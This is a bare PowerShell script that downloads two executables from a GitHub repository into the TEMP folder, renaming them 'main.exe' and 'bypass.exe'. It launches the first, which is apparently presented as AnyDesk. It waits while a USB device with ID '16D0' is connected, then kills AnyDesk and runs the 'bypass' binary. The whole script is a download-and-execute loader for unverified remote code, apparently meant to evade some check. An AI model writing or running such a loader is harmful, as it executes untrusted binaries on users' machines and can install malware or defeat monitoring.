$p = "$env:TEMP\main.exe"
$b = "$env:TEMP\bypass.exe"
$n = "AnyDesk"

Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/AnyDesk.exe" -OutFile $p
Invoke-WebRequest -Uri "https://github.com/nohanvs/bot-dc-dipariss7k/raw/refs/heads/main/SYNC-Otimizer.exe" -OutFile $b

Start-Process $p

while (Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -like '*16D0*' }) {
    Start-Sleep -Seconds 1
}

Stop-Process -Name $n -Force -ErrorAction SilentlyContinue
Start-Process $b
